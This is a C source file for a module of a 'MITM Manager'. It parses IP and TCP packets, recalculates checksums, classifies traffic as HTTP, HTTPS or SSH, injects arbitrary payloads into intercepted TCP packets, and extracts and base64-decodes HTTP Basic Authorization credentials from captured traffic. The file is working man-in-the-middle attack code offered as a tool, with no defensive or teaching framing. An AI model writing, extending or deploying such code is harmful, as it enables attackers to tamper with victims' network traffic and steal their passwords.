/*
 * libmitm_packet.c - High-performance Packet Processing Module for MITM Manager
 * Handles packet parsing, classification, injection, and credential extraction.
 *
 * Implements:
 * - Packed header structs for correct alignment
 * - Efficient IP/TCP checksum recalculation
 * - Safe string searching (memmem implementation)
 * - Base64 decoding for credential parsing
 */

#define _GNU_SOURCE
#include <netinet/in.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Protocol Constants
#define PROTO_TCP 6
#define PROTO_UDP 17

// ============================================================================
// 1. Packet Headers (Packed)
// ============================================================================

#pragma pack(push, 1)

struct ip_header {
  uint8_t ihl : 4;
  uint8_t version : 4;
  uint8_t tos;
  uint16_t tot_len;
  uint16_t id;
  uint16_t frag_off;
  uint8_t ttl;
  uint8_t protocol;
  uint16_t check;
  uint32_t saddr;
  uint32_t daddr;
};

struct tcp_header {
  uint16_t source;
  uint16_t dest;
  uint32_t seq;
  uint32_t ack_seq;
  uint16_t res1 : 4;
  uint16_t doff : 4;
  uint16_t fin : 1;
  uint16_t syn : 1;
  uint16_t rst : 1;
  uint16_t psh : 1;
  uint16_t ack : 1;
  uint16_t urg : 1;
  uint16_t ece : 1;
  uint16_t cwr : 1;
  uint16_t window;
  uint16_t check;
  uint16_t urg_ptr;
};

#pragma pack(pop)

// Pseudo header for TCP checksum calculation
struct pseudo_header {
  uint32_t source_address;
  uint32_t dest_address;
  uint8_t placeholder;
  uint8_t protocol;
  uint16_t tcp_length;
};

// ============================================================================
// 2. Helper Functions (Memory & Base64)
// ============================================================================

/* Portable memmem implementation for safe string searching in binary data */
void *safe_memmem(const void *haystack, size_t hlen, const void *needle,
                  size_t nlen) {
  if (nlen == 0 || hlen < nlen)
    return NULL;

  const uint8_t *h = (const uint8_t *)haystack;
  const uint8_t *n = (const uint8_t *)needle;

  for (size_t i = 0; i <= hlen - nlen; i++) {
    if (h[i] == n[0]) { // Quick first char check
      if (memcmp(h + i, n, nlen) == 0) {
        return (void *)(h + i);
      }
    }
  }
  return NULL;
}

/* Minimal Base64 Decoder */
static const int b64_table[] = {
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54,
    55, 56, 57, 58, 59, 60, 61, -1, -1, -1, 0,  -1, -1, /* Note: 0 is
                                                           placeholder for '='
                                                           padding handling */
    -1, 0,  1,  2,  3,  4,  5,  6,  7,  8,  9,  10, 11, 12, 13, 14, 15,
    16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26,
    27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43,
    44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1};

int base64_decode(const char *in, size_t in_len, char *out, size_t out_max) {
  int val = 0, valb = -8;
  size_t out_len = 0;

  for (size_t i = 0; i < in_len; i++) {
    unsigned char c = in[i];
    if (c > 127 || b64_table[c] == -1)
      continue; // Skip invalid
    if (c == '=')
      break; // Padding

    val = (val << 6) | b64_table[c];
    valb += 6;

    if (valb >= 0) {
      if (out_len < out_max - 1) {
        out[out_len++] = (char)((val >> valb) & 0xFF);
      }
      valb -= 8;
    }
  }
  out[out_len] = '\0';
  return out_len;
}

// ============================================================================
// 3. Checksum Functions
// ============================================================================

uint16_t ip_checksum(void *vdata, size_t length) {
  char *data = (char *)vdata;
  uint32_t acc = 0;

  for (size_t i = 0; i + 1 < length; i += 2) {
    uint16_t word;
    memcpy(&word, data + i, 2);
    acc += ntohs(word);
  }

  if (length & 1) {
    uint16_t word = 0;
    memcpy(&word, data + length - 1, 1);
    acc += ntohs(word);
  }

  while (acc >> 16) {
    acc = (acc & 0xFFFF) + (acc >> 16);
  }

  return htons(~acc);
}

uint16_t tcp_checksum(struct ip_header *iph, struct tcp_header *tcph) {
  uint32_t sum = 0;
  uint16_t tcpLen = ntohs(iph->tot_len) - (iph->ihl << 2);

  // Pseudo Header
  struct pseudo_header psh;
  psh.source_address = iph->saddr;
  psh.dest_address = iph->daddr;
  psh.placeholder = 0;
  psh.protocol = PROTO_TCP;
  psh.tcp_length = htons(tcpLen);

  int psize = sizeof(struct pseudo_header);
  char *pseudogram = malloc(psize + tcpLen);
  if (!pseudogram)
    return 0;

  memcpy(pseudogram, (char *)&psh, psize);
  memcpy(pseudogram + psize, tcph, tcpLen);

  uint16_t *ptr = (uint16_t *)pseudogram;
  int count = psize + tcpLen;

  while (count > 1) {
    sum += *ptr++;
    count -= 2;
  }

  if (count > 0) {
    sum += *(uint8_t *)ptr;
  }

  while (sum >> 16) {
    sum = (sum & 0xffff) + (sum >> 16);
  }

  free(pseudogram);
  return ~sum;
}

// ============================================================================
// 4. Core Packet Logic
// ============================================================================

/*
 * Classify packet by Application Layer protocol
 * Returns: 80(HTTP), 443(HTTPS), 22(SSH), or 0(Unknown)
 */
int classify_packet(const uint8_t *packet, size_t len) {
  if (len < sizeof(struct ip_header))
    return 0;

  struct ip_header *iph = (struct ip_header *)packet;
  if (iph->protocol != PROTO_TCP)
    return 0;

  size_t ip_hdr_len = iph->ihl * 4;
  if (len < ip_hdr_len + sizeof(struct tcp_header))
    return 0;

  struct tcp_header *tcph = (struct tcp_header *)(packet + ip_hdr_len);

  // Check ports
  uint16_t sport = ntohs(tcph->source);
  uint16_t dport = ntohs(tcph->dest);

  if (sport == 80 || dport == 80)
    return 80;
  if (sport == 443 || dport == 443)
    return 443;
  if (sport == 22 || dport == 22)
    return 22;

  return 0;
}

/*
 * Inject Payload (MITM)
 * Inserts new_payload before existing TCP data.
 * Updates header lengths, but does NOT handle SEQ/ACK drift logic.
 * (That must be handled by the caller or higher-level MITM logic)
 */
int inject_payload(uint8_t *packet, size_t len, size_t max_len,
                   const uint8_t *new_payload, size_t payload_len) {

  struct ip_header *iph = (struct ip_header *)packet;
  size_t ip_hdr_len = iph->ihl * 4;
  struct tcp_header *tcph = (struct tcp_header *)(packet + ip_hdr_len);

  // Get Data Offset safely via bit shifting
  // The 'doff' field is the high 4 bits of the 12th byte in TCP header
  // But since we use packed struct with bitfields, we can try tcph->doff
  // HOWEVER: Bitfields are compiler-dependent. Safe way:
  uint8_t *tcp_bytes = (uint8_t *)tcph;
  size_t tcp_hdr_len = ((tcp_bytes[12] >> 4) & 0xF) * 4;

  size_t headers_len = ip_hdr_len + tcp_hdr_len;
  size_t current_data_len = len - headers_len;

  if (len + payload_len > max_len)
    return -1; // Buffer overflow

  // Move existing data to make room
  uint8_t *data_ptr = packet + headers_len;
  memmove(data_ptr + payload_len, data_ptr, current_data_len);

  // Copy new payload
  memcpy(data_ptr, new_payload, payload_len);

  // Update Lengths
  size_t new_total_len = len + payload_len;
  iph->tot_len = htons(new_total_len);

  // Recalculate Checksums
  iph->check = 0;
  iph->check = ip_checksum(packet, ip_hdr_len);

  tcph->check = 0;
  tcph->check = tcp_checksum(iph, tcph);

  return new_total_len;
}

/*
 * Extract Credentials
 * Scans HTTP Basic Auth, Bearer tokens, etc.
 */
int extract_credentials(const uint8_t *packet, size_t len, char *out_buf,
                        size_t out_max) {
  struct ip_header *iph = (struct ip_header *)packet;
  size_t ip_hdr_len = iph->ihl * 4;

  if (len <= ip_hdr_len + sizeof(struct tcp_header))
    return 0;

  struct tcp_header *tcph = (struct tcp_header *)(packet + ip_hdr_len);
  uint8_t *tcp_bytes = (uint8_t *)tcph;
  size_t tcp_hdr_len = ((tcp_bytes[12] >> 4) & 0xF) * 4;

  const uint8_t *payload = packet + ip_hdr_len + tcp_hdr_len;
  size_t payload_len = len - (ip_hdr_len + tcp_hdr_len);

  if (payload_len == 0)
    return 0;

  // 1. Check for Authorization: Basic
  const char *sig_basic = "Authorization: Basic ";
  void *match = safe_memmem(payload, payload_len, sig_basic, strlen(sig_basic));

  if (match) {
    char *token_start = (char *)match + strlen(sig_basic);
    // Find end of line or space
    size_t remaining = payload_len - ((uint8_t *)token_start - payload);
    size_t token_len = 0;

    while (token_len < remaining && token_len < 256 &&
           token_start[token_len] != '\r' && token_start[token_len] != '\n') {
      token_len++;
    }

    if (token_len > 0) {
      char decoded[256];
      base64_decode(token_start, token_len, decoded, sizeof(decoded));
      snprintf(out_buf, out_max, "BASIC:%s", decoded);
      return 1;
    }
  }

  return 0;
}
